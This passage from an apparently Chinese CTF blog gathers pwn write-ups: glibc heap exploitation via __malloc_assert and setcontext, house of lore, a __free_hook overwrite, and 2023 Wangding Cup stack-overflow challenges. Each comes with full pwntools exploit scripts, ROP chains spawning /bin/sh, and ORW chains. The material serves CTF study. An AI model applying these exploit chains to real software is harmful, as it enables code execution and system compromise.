也就得到了0x25\n随后就可以成功跳转 执行__malloc_assert函数 所以通过largebin bin来执行malloc_assert函数的关键在于修改链表中的chunk的size域倒数第三位为1\n实际利用下面演示的程序由本人自己编写  存在许多明显漏洞 包括但不限于UAF 堆溢出 其他比赛题目需要根据真实情况作修改 下文不做模板使用\n演示虚拟机:ubuntu22.04  使用的libc版本为libc2.32\n首先 获取要用到的一些地址 libc由我程序自带的漏洞函数泄露\nlibc_addr = get_libc()setcontext_addr = libc_addr + 0x5306DIO_helper_jumps = libc_addr + 0x1e48c0IO_file_jumps = libc_addr  + 0x1e54c0open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]rdi_addr = libc_addr + next(libc.search(asm(&#x27;pop rdi;ret;&#x27;)))rsi_addr = libc_addr + next(libc.search(asm(&#x27;pop rsi;ret;&#x27;)))rdx_r12_addr = libc_addr + 0x0000000000114161ret_addr = 0x000000000040101asuccess(hex(rdi_addr))\n\n接着 按照上面所说的 我们需要利用fllush函数中涉及到的call qword ptr [rbp+0x60]\n而rbp的值默认为IO_file_jumps 所以只需要利用任意写修改IO_file_jumps+0x60处为想要调用的地址 这里也就是setcontext+61\n我采用的办法是tcache attack 不过由于libc2.32新增了fd异或 所以需要先泄露堆地址\nadd(0x10)#0add(0x10)#1delete(0)show(0)io.recv()key = u64(io.recvuntil(&quot;\\n&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))delete(1)edit(1,8,p64((IO_file_jumps+0x60)^key))add(0x10)#2add(0x10)#3edit(3,8,p64(setcontext_addr))\n\n其次是设定rdx+0xa0和0xa8处为我们想要的数据 以此来控制rsp寄存器和最后ret返回的地址\n默认开启了沙盒 所以此时我们构造的rop链采用orw的形式\nadd(0x20)#4add(0x20)#5delete(4)delete(5)edit(5,8,p64((IO_helper_jumps+0xa0)^key))add(0x20)#6add(0x20)#7edit(6,8,b&#x27;./flag\\x00\\x00&#x27;)flag_addr = key*0x1000 + 0x310success(hex(flag_addr))payload = p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(elf.bss(0x500))+p64(rdx_r12_addr)+p64(0x100)+p64(0)+p64(read_addr)payload += p64(rdi_addr)+p64(1)+p64(rsi_addr)+p64(elf.bss(0x500))+p64(rdx_r12_addr)+p64(0x100)+p64(0)+p64(write_addr)add(0x100)#8edit(8,len(payload),payload)chunk8_addr = key*0x1000+0x340edit(7,0x10,p64(chunk8_addr)+p64(ret_addr))\n\n最后就是通过修改修改largebin chunk的size域 以及来触发__malloc_assert函数\nadd(0x10)#9add(0x410)#10add(0x10)#11delete(10)add(0x420)#12add(0x420)#13delete(12)payload = cyclic(0x18)+p64(0x425)edit(9,len(payload),payload)gdb.attach(io,&#x27;b *0x4013EF&#x27;)pause(0)add(0x430)#14pause()\n\n如果采用的是修改top chunk的size域 使其不够分配chunk 进入sysmalloc函数 则为\nadd(0x10)#9payload = cyclic(0x18)+p64(0x101)edit(9,len(payload),payload)gdb.attach(io,&#x27;b *0x4013EF&#x27;)pause(0)add(0x1000)pause()\n\n完整esp:\nfrom pwn import*io = process(&quot;./heap&quot;)elf = ELF(&quot;./heap&quot;)libc = ELF(&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]def debug():    gdb.attach(io)    pause()def add(size):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;You can customize the size of chunk, but what about your life&quot;)    io.sendline(str(size))def delete(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;)    io.sendline(str(index))def edit(index,size,payload):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;It&#x27;s never too late to start again. What do you regret?&quot;)    io.sendline(str(index))    io.recvuntil(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;)    io.sendline(str(size))    io.recvuntil(&quot;Come back!&quot;)    io.send(payload)def show(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;You can&#x27;t live a perfect life without making any effort&quot;)    io.sendline(str(index))def get_libc():    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&#x27;5&#x27;)    io.recv()    libc_addr = int(io.recv(14),16) - libc.sym[&#x27;puts&#x27;]    success(&quot;libc_addr :&quot;+hex(libc_addr))    return libc_addrlibc_addr = get_libc()setcontext_addr = libc_addr + 0x5306DIO_helper_jumps = libc_addr + 0x1e48c0IO_file_jumps = libc_addr  + 0x1e54c0open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]rdi_addr = libc_addr + next(libc.search(asm(&#x27;pop rdi;ret;&#x27;)))rsi_addr = libc_addr + next(libc.search(asm(&#x27;pop rsi;ret;&#x27;)))rdx_r12_addr = libc_addr + 0x0000000000114161ret_addr = 0x000000000040101asuccess(hex(rdi_addr))add(0x10)#0add(0x10)#1delete(0)show(0)io.recv()key = u64(io.recvuntil(&quot;\\n&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))delete(1)edit(1,8,p64((IO_file_jumps+0x60)^key))add(0x10)#2add(0x10)#3edit(3,8,p64(setcontext_addr))add(0x20)#4add(0x20)#5delete(4)delete(5)edit(5,8,p64((IO_helper_jumps+0xa0)^key))add(0x20)#6add(0x20)#7edit(6,8,b&#x27;./flag\\x00\\x00&#x27;)flag_addr = key*0x1000 + 0x310success(hex(flag_addr))payload = p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(elf.bss(0x500))+p64(rdx_r12_addr)+p64(0x100)+p64(0)+p64(read_addr)payload += p64(rdi_addr)+p64(1)+p64(rsi_addr)+p64(elf.bss(0x500))+p64(rdx_r12_addr)+p64(0x100)+p64(0)+p64(write_addr)add(0x100)#8edit(8,len(payload),payload)chunk8_addr = key*0x1000+0x340edit(7,0x10,p64(chunk8_addr)+p64(ret_addr))# add(0x10)#9# payload = cyclic(0x18)+p64(0x101)# edit(9,len(payload),payload)# gdb.attach(io,&#x27;b *0x4013EF&#x27;)# pause(0)# add(0x1000)# pause()add(0x10)#9add(0x410)#10add(0x10)#11delete(10)add(0x420)#12add(0x420)#13delete(12)payload = cyclic(0x18)+p64(0x425)edit(9,len(payload),payload)gdb.attach(io,&#x27;b *0x4013EF&#x27;)pause(0)add(0x430)#14pause()\n\n","categories":["堆"]},{"title":"2023网鼎杯","url":"/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/","content":"题目的本身的难度非常简单 因为是RHG类型的题目 不过大部分都是静态编译的题目 并且删除了符号表 以前还没有接触过类似的题目 所以这次来学习一下怎么逻辑推理出各个函数\n下面的顺序被我打乱了 因为附件也是学长发的  所以凑合着做吧\npwn1\n32位 保护机制基本上全关了\n解析来进入ida 由于删除了符号表 所以也不知道哪一个函数是main 先点进唯一有符号的start函数\n// positive sp value has been detected, the output may be wrong!void __usercall __noreturn start(int a1@&lt;eax&gt;, int a2@&lt;edx&gt;)&#123;  int v2; // esi  int v3; // [esp-4h] [ebp-4h] BYREF  void *retaddr; // [esp+0h] [ebp+0h] BYREF  v2 = v3;  v3 = a1;  sub_8049200(sub_804890C, v2, &amp;retaddr, sub_80495D0, sub_8049670, a2, &amp;v3);&#125;\n\n根据以往的经验分析 sub_8049200应该是libc_start_main函数\n那么作为其rdi参数的sub_804890C应该是main函数了\nvoid __noreturn sub_804890C()&#123;  sub_804887C();  while ( 1 )    sub_80488CE();&#125;\n\n跟进以后 可以看到不像是libc函数 为出题人编写的 所以猜测正确 为main函数 接下来分别跟进两个函数\nint sub_804887C()&#123;  sub_80511E0(off_80EB4BC, 0);  sub_80511E0(off_80EB4B8, 0);  sub_80511E0(off_80EB4B4, 0);  return sub_806D410(300);&#125;\n\n三个一样的函数 对.data段上三个相邻的参数进行操作 并且第二个参数还是0 这怎么看都是清空缓存区 用的setbuf函数嘛\n至于最后的函数调用 我猜是alarm闹钟函数 毕竟有个300的参数\nint sub_80488CE()&#123;  char v1[104]; // [esp+0h] [ebp-68h] BYREF  sub_804F4C0(&quot;please input what you want say&quot;);  sub_806DDA0(0, v1, 256);  return sub_804F9D0(v1);&#125;\n\n这个函数应该就是漏洞点了   sub_804F4C0函数要么是printf要么是puts 直接运行程序并没有输出换行符 那么应该是printf\nsub_806DDA0看参数应该是read函数 最后的sub_804F9D0函数经过直接运行程序猜测是puts函数\n\n那么至此程序的主要逻辑就明了了   while重复执行sub_80488CE函数 该函数存在栈溢出漏洞\n再加上是静态编译 那么此时直接利用ROPgadget自带的构造rop链 getshell\nROPgadget --binary pwn --ropchain\n\n完整exp:\nfrom pwn import*from ctypes import *from struct import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;please input what you want say&quot;)p = b&#x27;a&#x27; * (0x68+4)p += pack(&#x27;&lt;I&#x27;, 0x0806f83b) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080b8eb6) # pop eax ; retp += b&#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805502b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806f83b) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080b8eb6) # pop eax ; retp += b&#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805502b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806f83b) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080495a3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0805502b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080df8bd) # pop ecx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x0806f83b) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080495a3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806d443) # int 0x80success(&quot;len :&quot;+hex(len(p)))io.sendline(p)io.interactive()\n\npwn2\n还是跟上题一样 保护基本没开 静态编译32位\n老规矩 还是跟着start函数索引到main函数\nint sub_80488CE()&#123;  int v0; // eax  char v2; // [esp-Ch] [ebp-24h]  int v3; // [esp+Ch] [ebp-Ch]  sub_804887C();  v3 = sub_8059F50(48);  sub_8048987(v3, 48);  v0 = sub_804DBD0(v3 + 16) + 5;  if ( v0 == 8 )  &#123;    sub_8048987(v3, 48);  &#125;  else if ( v0 &gt; 8 )  &#123;    if ( v0 == 10 )      return 0;    if ( v0 == 85145 )      sub_804F700(&quot;/bin/sh&quot;);  &#125;  else if ( v0 == 6 )  &#123;    sub_804FA00(&quot;where is shell&quot;, v2);  &#125;  return 1;&#125;\n\n第一个涉及到的函数\nint sub_804887C()&#123;  sub_8051720(off_80EB4BC, 0);  sub_8051720(off_80EB4B8, 0);  sub_8051720(off_80EB4B4, 0);  return sub_806D9C0(300);&#125;\n\n很明显是setbuf清空缓存区\n第二个函数 参数是一个数值 并且在函数最后找到了这样一行字符串\nif ( v4 != _EBX )  sub_8056280(&quot;__libc_malloc&quot;);\n\n所以大胆猜测是malloc 随后断点打在call 后 观察eax是否为堆地址返回值 成功验证猜想\n\n至于第三个函数 看参数没有多少印象 所以觉得是出题人自己编写的函数 还得跟进一下看实现逻辑\nint __cdecl sub_8048987(int a1, int a2)&#123;  int i; // [esp+Ch] [ebp-Ch]  for ( i = 0; a2 - 1 &gt; i; ++i )  &#123;    if ( sub_806E380(0, i + a1, 1) != 1 )      sub_804E660(1);    if ( *(_BYTE *)(i + a1) == 10 )      break;  &#125;  *(_BYTE *)(i + a1) = 0;  return i;&#125;\n\nsub_806E380函数的参数构造有点像read  sub_804E660的参数构造像exit函数\n那么结合函数整体的逻辑 我认为是一个往刚刚申请的chunk中读入数据的函数 当读入的字符为\\n时  结束读入 并且把\\n字符所处的位置设置为\\x00\n接下来第四个函数应该是最关键的了  从main函数的逻辑来看 这个函数的返回值将决定是否能够触发system(“&#x2F;bin&#x2F;sh”)\nint __cdecl sub_804DBD0(int a1)&#123;  return sub_804E880(a1, 0, 10);&#125;\n\n内部还调用了一个函数 不过这个函数的参数就有点眼熟了  a1是chunk的用户块+0x10处的地址 第二个参数为0\n第三个参数是10  有点像strtol函数 为了印证猜想 看看函数结束后的eax寄存器是不是预期返回值\npayload = cyclic(0x10)+b&#x27;85140&#x27;\n\n\n之所以多了5 是因为在v0的值是strtol函数的返回值+5\n那么就会进入对应的if判断式 直接调用system(“&#x2F;bin&#x2F;sh”)\n至于最后的函数 实在是猜不出来 最后用sig文件解析了一下 再加上chatgpt 大概了解到其是一个可以直接把字符串输出到标准输出流的函数\nint sub_804FA00(int a1, ...)&#123;  va_list va; // [esp+14h] [ebp+8h] BYREF  va_start(va, a1);  return _IO_vfprintf_internal(off_80EB4B8, a1, (char *)va);&#125;\n\nexp：\nfrom pwn import*from ctypes import *from struct import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()payload = cyclic(0x10)+b&#x27;85140&#x27;# gdb.attach(io,&#x27;b *0x8048935&#x27;)# pause(0)io.sendline(payload)io.interactive()\n\npwn3一开始还以为是个手写可见字符shellcode 但是转念一想 反正保护全关 也有很长的栈溢出 那就可以直接打呗\n静态编译的程序一般都是打系统调用的 这里太久没做了 还卡住了 忘记32位的系统调用是int 0x80了 傻傻的用syscall打了半天\n\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  init();  while ( 1 )    vuln();&#125;\n\nint vuln()&#123;  unsigned int v0; // eax  char v2[96]; // [esp+8h] [ebp-70h] BYREF  unsigned int j; // [esp+68h] [ebp-10h]  int i; // [esp+6Ch] [ebp-Ch]  printf(&quot;please input what you want say&quot;);  read_len = read(0, v2, 288);  for ( i = 0; i &lt; read_len; ++i )  &#123;    for ( j = 0; ; ++j )    &#123;      v0 = strlen(byte_80EB068);      if ( v0 &lt;= j )        break;      if ( v2[i] == *(j + 0x80EB068) )        exit(0);    &#125;  &#125;  return puts(v2);&#125;\n\n对于输入的字符进行了一个检查 如果为BINSHbinsh就exit\n不过不影响 直接构造rop链 往bss段写binsh 随后execve系统调用就好了\nfrom pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node5.anna.nssctf.cn&quot;,28881)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;please input what you want say&quot;)edi_addr = 0x08048480eax_addr = 0x080b8f16ebx_addr = 0x080481c9ecx_addr = 0x080df91d edx_addr = 0x0806f89bsyscall_addr = 0x0806331dsh_addr=  0x80EB070bss_addr = elf.bss(0x400)read_addr = 0x806DE00main_addr = 0x8048972int80_addr =0x0806d4a3payload = b&#x27;e&#x27;*0x74+p32(read_addr)+p32(main_addr)+p32(0)+p32(bss_addr)+p32(0x20)# gdb.attach(io,&#x27;b *0x8048971 &#x27;)# pause(0)io.send(payload)# pause()io.send(b&#x27;/bin/sh\\x00&#x27;)io.recvuntil(&quot;please input what you want say&quot;)payload = b&#x27;e&#x27;*0x74+p32(eax_addr)+p32(0xb)+p32(ebx_addr)+p32(bss_addr)+p32(ecx_addr)+p32(0)+p32(int80_addr)# gdb.attach(io,&#x27;b *0x8048971 &#x27;)# pause(0)io.send(payload)# pause()io.interactive()\n\npwn4依然是什么保护都没有开\n\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  init();  while ( 1 )    vuln();&#125;\n\nint vuln()&#123;  char v1[336]; // [esp+0h] [ebp-1B8h] BYREF  char v2[104]; // [esp+150h] [ebp-68h] BYREF  puts(&quot;please input your username&quot;);  read(0, v2, 0x20);  puts(&quot;please input your passwd&quot;);  read(0, v1, 0x14F);  return check(v1);&#125;\n\n没有栈溢出 v1作为check函数的参数 跟进一下\nint __cdecl check(int a1)&#123;  int result; // eax  char v2[16]; // [esp+Fh] [ebp-19h] BYREF  unsigned __int8 v3; // [esp+1Fh] [ebp-9h]  v3 = strlen(a1);  if ( v3 &gt; 6u &amp;&amp; v3 &lt;= 8u )  &#123;    printf(&quot;nice&quot;);    result = strcpy(v2, a1);  &#125;  else  &#123;    printf(&quot;passwd error&quot;);    result = 0;  &#125;  return result;&#125;\n\n针对v1的长度进行了检测 只有7和8的时候可以调用strcpy进行栈溢出 这里一开始想的是直接\\x00绕过strlen 后来意识到strcpy也会被绕过 这个时候注意到v3这个参数的异常 你可以发现其位于ebp-0x9 这个位置有点不对劲 所以切换成汇编看一下\n\nstrlen的返回值存储在eax中 而用来比较的是al寄存器的值 所以这里可以绕过\n原因就在于如果数值大一点 使得二进制形式的eax的1都位于高位 使得低八位的值比较小 就可以绕过了\n完整exp:\nfrom pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node5.anna.nssctf.cn&quot;,28881)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;please input your username&quot;)io.send(b&#x27;chen&#x27;)io.recvuntil(&quot;please input your passwd&quot;)backdoor_addr = 0x80488CEpayload = cyclic(0x19+0x4)+p32(backdoor_addr)+cyclic(0xe6)# gdb.attach(io,&#x27;b *0x80488FB&#x27;)# pause(0)io.send(payload)# pause()io.interactive()\n\n","categories":["wp"]},{"title":"house of lore","url":"/2023/04/27/house-of-lore/","content":"一种基于smallbin的任意写的攻击手法 不过要求非常高 需要先修改ptr_addr处 以此来绕过检查  所以我感觉是非常鸡肋的一种手法 不过还是记录一下\n源码分析 if (in_smallbin_range (nb))   &#123;     idx = smallbin_index (nb);     bin = bin_at (av, idx);     if ((victim = last (bin)) != bin)       &#123;         if (victim == 0) /* initialization check */           malloc_consolidate (av);         else           &#123;             bck = victim-&gt;bk;if (__glibc_unlikely (bck-&gt;fd != victim))               &#123;                 errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                 goto errout;               &#125;             set_inuse_bit_at_offset (victim, nb);             bin-&gt;bk = bck;             bck-&gt;fd = bin;             if (av != &amp;main_arena)               victim-&gt;size |= NON_MAIN_ARENA;             check_malloced_chunk (av, victim, nb);             void *p = chunk2mem (victim);             alloc_perturb (p, bytes);             return p;           &#125;       &#125;   &#125;\n\n这段源码调用是在申请smallbin中的free chunk时\nidx = smallbin_index (nb);bin = bin_at (av, idx);\n\n这两句的作用在于获取smallbin的指针 idx的值为5 bin_at函数依据idx来搜寻对应的chunk\n\nlast (bin)实际上是一个宏定义\n#define last(b)      ((b)-&gt;bk)\n\n如果其与bin本身相等 则无法进入判断 wiki上的解释是说明此时链表为空 但是我测试如果利用malloc_consolidate来把fastbin放入smallbin 貌似也过不了判断\n过了if后  还会进行一次判断 此时是判断small bin有没有进行初始化 如果初始化了就进入第二个分支\n__glibc_unlikely (bck-&gt;fd != victim)\n\n如果绕过这个判断就是实现本次攻击手法的关键\n对于bck-&gt;fd指向的地址做了检测 而bck是通过这条赋值的\nbck = victim-&gt;bk;\n\n也就是说我们要构造成下面这样\n\n之所以还要一个fake chunk2 是因为 如果只有fake chunk1 那么我们通过的是将attack_chunk从smallbin中申请出来的那次判断  此时plmalloc误判把fake chunk接到了 smallbin的倒数第二个 下次再次申请合适大小的chunk 就会申请到fake chunk\n而要把fake chunk申请出来的话 就得再进行一次判断 也就用到了fake chunk2 不过这一点倒不是很需要担心 这需要对fake chunk的地址延申几个字长出来 用来充当fake chunk2就可以了\n实际利用演示程序: 由我自己编写 包含UAF 堆溢出等漏洞\n演示环境: ubuntu20 替换libc为libc2.23\nfake_chunk1 = elf.bss(0x500)fake_chunk2 = elf.bss(0x700)add(0x100)#0add(0x10)#1add(0x10)#2delete(0)add(0x200)#3delete(1)delete(2)debug()show(2)io.recv()heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))-0x110success(&quot;heap_addr :&quot;+hex(heap_addr))\n\n首先需要泄露堆地址 以便我们进行fake chunk的构造\n\n随后进行fakechunk1和fakechunk2的构造 为了省事我程序自带了一个任意写的函数  具体题目的话 需要自己根据情况来构造\npayload = p64(0)+p64(fake_chunk1)edit(0,len(payload),payload)chunk_addr = heap_addrpayload = p64(0)*2 + p64(chunk_addr)+p64(fake_chunk2)write_somewhere(fake_chunk1,payload)payload = p64(0)*2 + p64(fake_chunk1)write_somewhere(fake_chunk2,payload)\n\n随后就是申请两个和smallbin chunk同样大小的chunk 第二个就会申请到fake chunk1的位置\nadd(0x100)#4add(0x100)#5\n\n\n同时你可以注意到 fake chunk1和fake chunk2其实就隔一点字长就行 我上面还给空了0x100字节 其实就利用同一次任意写输入即可\n总结我是对这个办法不太报希望  因为利用难度比较高 需要前提就具备一个已知地址任意写的漏洞  少数题目可能会提供 或者需要跟其他链配合利用 属于是单个存在没有什么用的链吧 我感觉 以后可能会打脸\n","categories":["堆"]},{"title":"贵阳大数据及网络安全精英对抗赛","url":"/2023/05/02/%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9B/","content":"就搞到一题附件 做了下发现对于只能操控单个chunk的利用手法不够熟练 于是用博客记录一下思路\n\nlibc版本是2.31 保护机制中规中矩 反正是个堆 都大差不差\nvoid *add()&#123;  void *v1; // [rsp-18h] [rbp-18h]  printf(&quot;size: &quot;);  __isoc99_scanf(&quot;%llu&quot;, &amp;nbytes);  if ( v1 != ptr )    v1 = malloc(nbytes);  printf(&quot;data: &quot;);  read(0, v1, nbytes);  puts(&quot;Create Complete!&quot;);  return v1;&#125;\n\nadd函数 只能操控一个chunk 不过这里的检查有漏洞 如果已经有一个chunk了 跳过的只是malloc的部分 输入data和size的并不受限 所以这里存在一个堆溢出漏洞\nint delete()&#123;  int result; // eax  result = (int)ptr;  if ( ptr )  &#123;    free(ptr);    result = puts(&quot;Delete Complete&quot;);  &#125;  return result;&#125;\n\ndelete函数 明显存在一个UAF漏洞\nint show()&#123;  int result; // eax  result = (int)ptr;  if ( ptr )    result = printf(&quot;Your Note: %s\\n&quot;, (const char *)ptr);  return result;&#125;\n\nshow函数 调用printf打印堆块内容\nint edit()&#123;  void *v1; // [rsp-8h] [rbp-8h]  if ( !ptr )    return puts(&quot;zero note!&quot;);  v1 = ptr;  printf(&quot;NewData: &quot;);  read(0, v1, nbytes);  return puts(&quot;Edit Complete!&quot;);&#125;\n\nedit函数 用来编辑堆块内容\n那么总结下来 就是只能同时控制一个chunk 但是可以利用的漏洞都给了 这种情况下 我想到的是通过填满tcachebin的链表 从而申请到fastbin chunk 随后利用malloc_consolidate来把fastbin chunk放入到smallbin中 从而利用UAF泄露libc基址\n还有一种办法是学习enllus1on师傅的  利用堆溢出覆盖top chunk的size 从而再次申请一个大chunk 于是就会重新分配一个top chunk 并且把原来的释放到unsortedbin中 这样也可以泄露libc基址\n下面两种办法都演示一遍\nadd(0x30,b&#x27;aaaa&#x27;)delete()for i in range(7):    edit(cyclic(0x10))    delete()add(0x80,b&#x27;aaaa&#x27;)bigchunk()\n\n这里来实现double free的原理是因为tcache高版本新加入的key 位于bk域 只要覆盖key 就可以绕过double free检测\n此时我们成功把fastbin中的chunk释放进入smallbin\n\ndelete()add(0x30,b&#x27;1&#x27;)show()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-1-0x1ebc30success(&quot;libc_addrr :&quot;+hex(libc_addr))\n\n随后就是重新申请这块空间 注意一下覆盖末位的值 需要减去 这样就成功获取到了libc基址\n还有一种办法 先利用堆溢出覆盖top chunk的size 注意这个size要使得top chunk起始地址+size刚好到一个页的起始\nadd(0x10, &#x27;\\x00&#x27;)payload = b&#x27;\\x00&#x27;*0x18 + p64(0xd51)add(len(payload), payload)delete()\n\n\n此时申请一个比top chunk大的chunk top chunk就会被释放进入unsortedbin\nadd(0x1000, &#x27;aaaa&#x27;)\n\n\n那么我们从unsortedbin中申请出来一个chunk 就可以泄露出libc基址\ndelete()add(0x20, &#x27;1&#x27;)show()libc_addr = u64(io.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x1ebbe0-0x551success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&quot;__free_hook&quot;]system_addr = libc_addr + libc.sym[&quot;system&quot;]\n\n接下来就是如何实现任意写了 由于只能控制一个chunk 所以哪怕我们有double free 也没有办法申请出来任意地址的chunk 所以我们需要把size域更改 使得chunk被重新释放时进入其他链表 从而使得原来的链表保留任意写的地址 听不懂没有关系 接下来来详解一下\ndelete()edit(p64(0)*2)delete()\n\n首先 利用老办法来构造一个double free的链表\n\n此时 tcachebin中有两个链表  并且二者是物理相邻的 我们先申请出低地址处的0x20的链表  为了堆溢出覆盖到下一个chunk\nadd(0x10,&#x27;aaaa&#x27;)payload = cyclic(0x18)+p64(0x51)+p64(free_hook-0x8)add(len(payload),payload)\n\n\n可以看到此时size域被修改了  并且链表中写入了我们的目标地址 之所以要减去8 是因为只能控制一个chunk 如果我们想要采用覆盖free_hook的办法来获取shell 那么被释放的chunk首地址一定要为&#x2F;bin&#x2F;sh或者其他能够getshell的参数\ndelete()add(0x20,b&#x27;aaaa&#x27;)\n\n\n此时把0x30的链表中申请出来 那么此时供我们控制的chunk指针也就是0x55e70eeee2b0这个 如果我们再次释放chunk呢\n此时就会把这个chunk释放到0x50的链表中 和我们0x30链表中任意写的地址错位开 那么此时再次申请0x20大小的chunk 就可以达到任意写的目的了\n完整exp:\nfrom pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;59.110.164.72&quot;,10001)elf = ELF(&quot;./pwn&quot;)context.terminal = 